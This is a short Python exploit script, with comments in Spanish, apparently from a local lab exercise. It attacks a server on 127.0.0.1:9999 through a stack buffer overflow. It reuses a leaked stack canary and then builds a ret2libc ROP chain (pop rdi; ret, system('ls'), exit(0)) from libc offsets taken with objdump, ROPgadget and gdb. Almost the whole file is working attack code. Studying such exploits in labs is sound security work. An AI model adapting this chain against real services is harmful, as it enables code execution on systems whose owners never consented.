#!/usr/bin/env python3
import struct
import socket
from srv_canary import *
HOST = "127.0.0.1"
PORT = 9999
TIMEOUT = 1.5

# offset de system() en la libc (objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system)
system_offset = 0x53110

# offset de exit() en la libc (objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep exit)
exit_offset = 0x42340

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
pop_rdi_ret_offset = 0x2a145

# offset de "ls" en la libc -> addr "ls" - (addr system - system_offset)
# (gdb) p system -> addr system
# (gdb) find 0x00007ffff7db0000, 0x00007ffff7f99000, "ls" ->  addr "ls" = 0x7ffff7dcc6a9
ls_offset = 0x1c6a9

def create_payload(libc_base, canary, padding):	
	payload  = b"A" * padding
	payload += canary  # Dirección del canario
	payload += b"A" * 8 # Saltea las siguiente direccion correspondiente al RBP
	
	pop_rdi_ret = libc_base + pop_rdi_ret_offset
	ls_addr = libc_base + ls_offset
	system_addr = libc_base + system_offset
	exit_addr = libc_base + exit_offset
	
	# ROP chain:
	payload += struct.pack("<Q", pop_rdi_ret)          # gadget: pop rdi; ret
	payload += struct.pack("<Q", ls_addr)             # argument → “ls”
	payload += struct.pack("<Q", system_addr)          # call system("ls")
	payload += struct.pack("<Q", pop_rdi_ret)          # gadget: pop rdi; ret
	payload += struct.pack("<Q", 0x0)                  # argument → 0 (exit code)
	payload += struct.pack("<Q", exit_addr)            # call exit(0)
	
	return payload

def exploit_srv(libc_base, canary, padding):
	payload = create_payload(libc_base, canary, padding);
	if test_payload(payload):
		print(f"[*] Enviando payload con libc {hex(libc_base)}")
		
if __name__ == "__main__":
	buffer_size = 64
	canary = find_canary(buffer_size, 8)
	offset = find_offset(buffer_size)
	libc = 0x00007ffff7dab000
	exploit_srv(libc, canary, offset)
